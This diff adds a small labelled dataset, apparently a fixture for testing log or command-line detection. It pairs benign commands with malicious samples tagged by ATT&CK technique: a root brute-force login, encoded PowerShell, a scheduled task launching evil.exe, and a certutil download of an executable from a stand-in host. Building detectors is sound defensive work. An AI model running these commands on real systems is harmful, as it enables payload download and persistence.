@@ -1,0 +1,8 @@
+{"message": "Failed password for root from 203.0.113.10", "malicious": true, "technique": "T1110"}
+{"message": "Accepted password for alice from 198.51.100.7", "malicious": false, "technique": ""}
+{"CommandLine": "powershell.exe -enc SQBFAFgA", "malicious": true, "technique": "T1059.001"}
+{"CommandLine": "powershell.exe Get-Date", "malicious": false, "technique": ""}
+{"CommandLine": "schtasks /create /tn Updater /tr evil.exe", "malicious": true, "technique": "T1053.005"}
+{"CommandLine": "schtasks /query", "malicious": false, "technique": ""}
+{"CommandLine": "certutil -urlcache -f http://example.test/a.exe a.exe", "malicious": true, "technique": "T1105"}
+{"CommandLine": "certutil -hashfile file.txt SHA256", "malicious": false, "technique": ""}
